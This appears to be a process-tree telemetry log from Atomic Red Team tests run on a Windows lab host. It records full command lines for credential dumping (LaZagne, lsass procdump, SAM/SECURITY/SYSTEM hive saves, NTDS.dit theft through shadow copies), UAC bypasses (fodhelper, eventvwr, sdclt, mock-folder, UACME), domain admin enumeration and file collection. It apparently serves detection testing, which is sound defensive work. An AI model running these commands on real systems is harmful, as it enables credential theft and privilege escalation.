+powershell.exe (PID 17484): "powershell.exe -ExecutionPolicy Bypass -C "echo test >> test.exe""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_iwib0zp3.hmf.ps1
+      wrote → C:\Users\Administrator\Desktop\shell\test.exe
+  └─ csc.exe (PID 2464): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\kv5u34xf\kv5u34xf.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\kv5u34xf\kv5u34xf.dll
+    └─ cvtres.exe (PID 18640): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES971B.tmp" "c:\Users\Administrator\AppData\Local\Temp\kv5u34xf\CSC843437488743C18614B83C6BFAB629.TMP""
+SearchProtocolHost.exe (PID 14464): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe26_ Global\UsGthrCtrlFltPipeMssGthrPipe26 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" "
+cmd.exe (PID 9808): "cmd.exe /C "lazagne1.exe browsers""
+  └─ lazagne1.exe (PID 7308): "lazagne1.exe  browsers"  [x2]
+        wrote → C:\Users\ADMINI~1\AppData\Local\Temp\_MEI73082\MSVCR90.dll
+        wrote → C:\Users\ADMINI~1\AppData\Local\Temp\_MEI73082\msvcp100.dll
+        wrote → C:\Users\ADMINI~1\AppData\Local\Temp\_MEI73082\msvcr100.dll
+        wrote → C:\Users\ADMINI~1\AppData\Local\Temp\_MEI73082\python27.dll
+        wrote → C:\Users\ADMINI~1\AppData\Local\Temp\_MEI73082\pywintypes27.dll
+        wrote → C:\Users\ADMINI~1\AppData\Local\Temp\_MEI73082\sqlite3.dll
+    └─ cmd.exe (PID 13980): "cmd.exe /c "reg.exe save hklm\security c:\users\admini~1\appdata\local\temp\tjbvkjpetfjp""
+      └─ reg.exe (PID 13948): "reg.exe  save hklm\security c:\users\admini~1\appdata\local\temp\tjbvkjpetfjp"
+    └─ cmd.exe (PID 16532): "cmd.exe /c "reg.exe save hklm\system c:\users\admini~1\appdata\local\temp\qsdirkg""
+      └─ reg.exe (PID 9404): "reg.exe  save hklm\system c:\users\admini~1\appdata\local\temp\qsdirkg"
+    └─ cmd.exe (PID 19212): "cmd.exe /c "reg.exe save hklm\sam c:\users\admini~1\appdata\local\temp\tthwwf""
+      └─ reg.exe (PID 19204): "reg.exe  save hklm\sam c:\users\admini~1\appdata\local\temp\tthwwf"
+cmd.exe (PID 12020): "cmd.exe /C "procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp ""
+  └─ procdump.exe (PID 9888): "procdump.exe  -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp "
+        wrote → C:\Users\Administrator\Desktop\shell\procdump64.exe
+    └─ procdump64.exe (PID 11608): "procdump.exe  -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp "
+cmd.exe (PID 11596): "cmd.exe /C "del /f /s lsass_dump.dmp""
+powershell.exe (PID 7640): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-AtomicTest T1003.003""  [x3]
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_ijitv5g4.5us.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_dwiqtosu.ogh.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_iezwnniu.alw.ps1
+  └─ csc.exe (PID 11976): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\nruqy5cg\nruqy5cg.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\nruqy5cg\nruqy5cg.dll
+    └─ cvtres.exe (PID 12416): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES1013.tmp" "c:\Users\Administrator\AppData\Local\Temp\nruqy5cg\CSC1FF97C2055D449BBBEB87BE2E99DAF3.TMP""
+  └─ cmd.exe (PID 5312): ""cmd.exe" /c "vssadmin.exe create shadow /for=C:""
+    └─ vssadmin.exe (PID 6780): "vssadmin.exe  create shadow /for=C:"
+  └─ cmd.exe (PID 17300): ""cmd.exe" /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE""
+    └─ reg.exe (PID 11828): "reg  save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE"
+  └─ cmd.exe (PID 4744): ""cmd.exe" /c "mkdir C:\Windows\Temp\ntds_T1003 & ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q""
+  └─ cmd.exe (PID 3764): ""cmd.exe" /c "wmic shadowcopy call create Volume=C:\""
+    └─ WMIC.exe (PID 15852): "wmic  shadowcopy call create Volume=C:\"
+  └─ cmd.exe (PID 18924): ""cmd.exe" /c "wmic /node:"localhost" shadowcopy call create Volume=C:\""
+    └─ WMIC.exe (PID 4120): "wmic  /node:"localhost" shadowcopy call create Volume=C:\"
+  └─ cmd.exe (PID 12648): ""cmd.exe" /c "wmic /node:"localhost" process call create "cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit"""
+    └─ WMIC.exe (PID 5292): "wmic  /node:"localhost" process call create "cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit""
+  └─ powershell.exe (PID 12332): ""powershell.exe" & {(gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')}"
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_iwwppbij.1gu.ps1
+    └─ csc.exe (PID 10460): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\c10mxv53\c10mxv53.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\c10mxv53\c10mxv53.dll
+      └─ cvtres.exe (PID 10876): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESF4B2.tmp" "c:\Users\Administrator\AppData\Local\Temp\c10mxv53\CSC6E5F326E65CB4C8CA191B86445142CF2.TMP""
+  └─ cmd.exe (PID 5188): ""cmd.exe" /c "vssadmin.exe create shadow /for=C: & mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1""
+    └─ vssadmin.exe (PID 11900): "vssadmin.exe  create shadow /for=C: "
+  └─ csc.exe (PID 7416): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\xrlie351\xrlie351.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\xrlie351\xrlie351.dll
+    └─ cvtres.exe (PID 4488): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESC0C3.tmp" "c:\Users\Administrator\AppData\Local\Temp\xrlie351\CSC852F58E99CB64A0C95446ED5EA10AF20.TMP""
+  └─ cmd.exe (PID 12772): ""cmd.exe" /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f & cmd.exe /c eventvwr.msc""  [x2]
+    └─ reg.exe (PID 3660): "reg.exe  add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f "  [x2]
+    └─ cmd.exe (PID 17452): "cmd.exe  /c eventvwr.msc"  [x2]
+  └─ cmd.exe (PID 14832): ""cmd.exe" /c "reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f & reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f & fodhelper.exe""  [x2]
+    └─ reg.exe (PID 17060): "reg.exe  add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f "  [x2]
+    └─ reg.exe (PID 5972): "reg.exe  add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f "  [x2]
+    └─ fodhelper.exe (PID 17284): "fodhelper.exe"  [x2]
+  └─ powershell.exe (PID 4560): ""powershell.exe" & {New-Item \""HKCU:\software\classes\ms-settings\shell\open\command\"" -Force New-ItemProperty \""HKCU:\software\classes\ms-settings\shell\open\command\"" -Name \""DelegateExecute\"" -Value \""\"" -Force Set-ItemProperty \""HKCU:\software\classes\ms-settings\shell\open\command\"" -Name \""(default)\"" -Value \""C:\Windows\System32\cmd.exe\"" -Force Start-Process \""C:\Windows\System32\fodhelper.exe\""}"  [x2]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_t4rwt5ly.d4g.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_agaspdjf.xuh.ps1
+    └─ csc.exe (PID 19148): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\4cals0xd\4cals0xd.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\4cals0xd\4cals0xd.dll
+      └─ cvtres.exe (PID 7096): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESCA78.tmp" "c:\Users\Administrator\AppData\Local\Temp\4cals0xd\CSC977122ACF9A84752986B5CFC7D99173.TMP""
+    └─ fodhelper.exe (PID 11160): ""C:\Windows\System32\fodhelper.exe" "  [x2]
+    └─ csc.exe (PID 11204): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\4jr2lw2r\4jr2lw2r.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\4jr2lw2r\4jr2lw2r.dll
+      └─ cvtres.exe (PID 3760): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES8363.tmp" "c:\Users\Administrator\AppData\Local\Temp\4jr2lw2r\CSCEC08DDD577CC493895D876906F9FA1FD.TMP""
+  └─ powershell.exe (PID 12976): ""powershell.exe" & {New-Item \""HKCU:\software\classes\ms-settings\shell\open\command\"" -Force New-ItemProperty \""HKCU:\software\classes\ms-settings\shell\open\command\"" -Name \""DelegateExecute\"" -Value \""\"" -Force Set-ItemProperty \""HKCU:\software\classes\ms-settings\shell\open\command\"" -Name \""(default)\"" -Value \""C:\Windows\System32\cmd.exe\"" -Force Start-Process \""C:\Windows\System32\ComputerDefaults.exe\""}"  [x2]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_osmv1izl.2ip.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_mu3yvdeo.3kl.ps1
+    └─ csc.exe (PID 17532): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\3cq0leld\3cq0leld.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\3cq0leld\3cq0leld.dll
+      └─ cvtres.exe (PID 19152): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESCD27.tmp" "c:\Users\Administrator\AppData\Local\Temp\3cq0leld\CSC187E15E7731943C4BBB9A8CABD238C30.TMP""
+    └─ ComputerDefaults.exe (PID 388): ""C:\Windows\System32\ComputerDefaults.exe" "  [x2]
+    └─ csc.exe (PID 668): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\gpoepipy\gpoepipy.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\gpoepipy\gpoepipy.dll
+      └─ cvtres.exe (PID 12472): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES8603.tmp" "c:\Users\Administrator\AppData\Local\Temp\gpoepipy\CSC3111D624A9FF4F08B52A5A747D5B76F2.TMP""
+  └─ cmd.exe (PID 12684): ""cmd.exe" /c "mkdir "\\?\C:\Windows \System32\" & copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe" & mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"""  [x2]
+        wrote → C:\Windows \System32\mmc.exe
+  └─ powershell.exe (PID 8568): ""powershell.exe" & {New-Item -Force -Path \""HKCU:\Software\Classes\Folder\shell\open\command\"" -Value 'cmd.exe /c notepad.exe' New-ItemProperty -Force -Path \""HKCU:\Software\Classes\Folder\shell\open\command\"" -Name \""DelegateExecute\"" Start-Process -FilePath $env:windir\system32\sdclt.exe Start-Sleep -s 3}"  [x2]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_qkee4pfc.ems.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_netgjuzz.utd.ps1
+    └─ csc.exe (PID 19096): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\5iftyvcm\5iftyvcm.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\5iftyvcm\5iftyvcm.dll
+      └─ cvtres.exe (PID 2444): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESD044.tmp" "c:\Users\Administrator\AppData\Local\Temp\5iftyvcm\CSC27B009C75C9452E90E9AE8020F7F368.TMP""
+    └─ sdclt.exe (PID 14384): ""C:\WINDOWS\system32\sdclt.exe" "  [x2]
+      └─ control.exe (PID 5624): ""C:\Windows\System32\control.exe"  /name Microsoft.BackupAndRestoreCenter"  [x2]
+    └─ csc.exe (PID 5836): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\xgx555x3\xgx555x3.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\xgx555x3\xgx555x3.dll
+      └─ cvtres.exe (PID 3896): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES88F1.tmp" "c:\Users\Administrator\AppData\Local\Temp\xgx555x3\CSC8DF35C5362E44A990BCABB7E1A737B7.TMP""
+  └─ cmd.exe (PID 10396): ""cmd.exe" /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f""  [x2]
+    └─ reg.exe (PID 3524): "reg.exe  ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"  [x2]
+  └─ cmd.exe (PID 7780): ""cmd.exe" /c "C:\AtomicRedTeam\atomics\T1548.002\src\T1548.002.bat""  [x2]
+    └─ mode.com (PID 10484): "mode  18,1"  [x2]
+    └─ reg.exe (PID 10476): "reg  add "HKCU\Environment" /v "windir" /d "cmd /c start powershell&REM " "  [x2]
+    └─ timeout.exe (PID 9320): "timeout  /t 2 "  [x2]
+    └─ schtasks.exe (PID 13468): "schtasks  /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I "  [x2]
+    └─ reg.exe (PID 8104): "reg  delete "HKCU\Environment" /v "windir" /F"  [x2]
+  └─ cmd.exe (PID 10664): ""cmd.exe" /c ""%temp%\uacme\23 Akagi64.exe"""  [x2]
+  └─ cmd.exe (PID 10524): ""cmd.exe" /c ""%temp%\uacme\31 Akagi64.exe"""  [x2]
+  └─ cmd.exe (PID 19192): ""cmd.exe" /c ""%temp%\uacme\33 Akagi64.exe"""  [x2]
+  └─ cmd.exe (PID 19320): ""cmd.exe" /c ""%temp%\uacme\34 Akagi64.exe"""  [x2]
+  └─ cmd.exe (PID 10772): ""cmd.exe" /c ""%temp%\uacme\39 Akagi64.exe"""  [x2]
+  └─ cmd.exe (PID 10020): ""cmd.exe" /c ""%temp%\uacme\56 Akagi64.exe"""  [x2]
+  └─ cmd.exe (PID 11272): ""cmd.exe" /c ""%temp%\uacme\59 Akagi64.exe"""  [x2]
+  └─ cmd.exe (PID 6376): ""cmd.exe" /c ""%temp%\uacme\61 Akagi64.exe"""  [x2]
+  └─ csc.exe (PID 5052): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\zu0ntn4v\zu0ntn4v.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\zu0ntn4v\zu0ntn4v.dll
+    └─ cvtres.exe (PID 10600): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES799F.tmp" "c:\Users\Administrator\AppData\Local\Temp\zu0ntn4v\CSC2330B617E9E745D1837EA7BC3312C3A.TMP""
+VSSVC.exe (PID 12872): "C:\WINDOWS\system32\vssvc.exe"  [x2]
+svchost.exe (PID 19340): "C:\WINDOWS\System32\svchost.exe -k swprv"  [x2]
+WmiApSrv.exe (PID 9904): "C:\WINDOWS\system32\wbem\WmiApSrv.exe"
+powershell.exe (PID 17316): "powershell.exe -ExecutionPolicy Bypass -C "net group \"domain admins\" /domain""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_fglmhwe2.2c2.ps1
+  └─ csc.exe (PID 18932): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\rkdbei0g\rkdbei0g.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\rkdbei0g\rkdbei0g.dll
+    └─ cvtres.exe (PID 9828): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES3C0B.tmp" "c:\Users\Administrator\AppData\Local\Temp\rkdbei0g\CSC7719DDB768E945B2A8F7EA9F7EEAEFD4.TMP""
+  └─ net.exe (PID 18996): ""C:\WINDOWS\system32\net.exe" group "domain admins" /domain"
+    └─ net1.exe (PID 8620): "C:\WINDOWS\system32\net1 group "domain admins" /domain"
+cmd.exe (PID 14096): "cmd.exe /C "netstat -an  ""
+  └─ NETSTAT.EXE (PID 14704): "netstat  -an  "
+cmd.exe (PID 2388): "cmd.exe /C "arp -a""  [x2]
+  └─ ARP.EXE (PID 5840): "arp  -a"  [x2]
+cmd.exe (PID 11676): "cmd.exe /C "mkdir C:\%HOMEPATH%\Desktop\T1022  & echo ipconfig /all > C:\%HOMEPATH%\Desktop\T1022\T1022.txt & 7z.exe a -tzip T1022.zip C:\%HOMEPATH%\Desktop\T1022""  [x2]
+  └─ 7z.exe (PID 17676): "7z.exe  a -tzip T1022.zip C:\\Users\Administrator\Desktop\T1022"  [x2]
+cmd.exe (PID 12476): "cmd.exe /C "rmdir /s /q C:\%HOMEPATH%\Desktop\T1022""  [x2]
+SearchProtocolHost.exe (PID 12896): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe27_ Global\UsGthrCtrlFltPipeMssGthrPipe27 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" "
+powershell.exe (PID 6812): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-AtomicTest T1119 ""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_qt1mzhkk.ga0.ps1
+  └─ csc.exe (PID 1148): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\ngon5zfo\ngon5zfo.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\ngon5zfo\ngon5zfo.dll
+    └─ cvtres.exe (PID 16840): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESDD4D.tmp" "c:\Users\Administrator\AppData\Local\Temp\ngon5zfo\CSCDE7D66C55CE4B34921037B59D738.TMP""
+  └─ cmd.exe (PID 8652): ""cmd.exe" /c "mkdir %temp%\T1119_command_prompt_collection >nul 2>&1 & dir c: /b /s .docx | findstr /e .docx & for /R c: %f in (*.docx) do copy %f %temp%\T1119_command_prompt_collection""
+    └─ cmd.exe (PID 14916): "C:\WINDOWS\system32\cmd.exe  /S /D /c" dir c: /b /s .docx ""
+    └─ findstr.exe (PID 3684): "findstr  /e .docx "
+  └─ powershell.exe (PID 7768): ""powershell.exe" & {New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}}"
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_0zyy5ekm.12e.ps1
+    └─ csc.exe (PID 18300): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\gpflxjkd\gpflxjkd.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\gpflxjkd\gpflxjkd.dll
+      └─ cvtres.exe (PID 6276): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESE173.tmp" "c:\Users\Administrator\AppData\Local\Temp\gpflxjkd\CSC86B0AA0D27684DF1B4E2DE43A4DCAD2.TMP""
+  └─ powershell.exe (PID 12084): ""powershell.exe" & {Get-Service > $env:TEMP\T1119_1.txt Get-ChildItem Env: > $env:TEMP\T1119_2.txt Get-Process > $env:TEMP\T1119_3.txt}"
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_r2dyz1fz.400.ps1
+    └─ csc.exe (PID 1864): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\dlshnqqn\dlshnqqn.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\dlshnqqn\dlshnqqn.dll
+      └─ cvtres.exe (PID 13448): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESE377.tmp" "c:\Users\Administrator\AppData\Local\Temp\dlshnqqn\CSC41612F346602455D895E54A0C6B7543A.TMP""
+  └─ cmd.exe (PID 16328): ""cmd.exe" /c "sc query type=service > %TEMP%\T1119_1.txt & doskey /history > %TEMP%\T1119_2.txt & wmic process list > %TEMP%\T1119_3.txt & tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt""
+    └─ sc.exe (PID 13580): "sc  query type=service  "
+    └─ doskey.exe (PID 18284): "doskey  /history  "
+    └─ WMIC.exe (PID 4288): "wmic  process list  "
+    └─ tree.com (PID 3132): "tree  C:\AtomicRedTeam\atomics "
+cleanmgr.exe (PID 14868): "C:\WINDOWS\system32\cleanmgr.exe /autoclean /d C:"  [x2]
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\AppxProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\AssocProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\CbsProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\DismCore.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\DismCorePS.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\DismHost.exe
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\DismProv.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\DmiProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\FfuProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\FolderProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\GenericProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\IBSProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\ImagingProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\IntlProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\LogProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\MsiProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\OfflineSetupProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\OSProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\ProvProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\SetupPlatformProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\SmiProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\SysprepProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\TransmogProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\UnattendProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\VhdProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\WimProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\AppxProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\AssocProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\CbsProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\DismCore.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\DismCorePS.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\DismHost.exe
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\DismProv.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\DmiProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\FfuProvider.dll
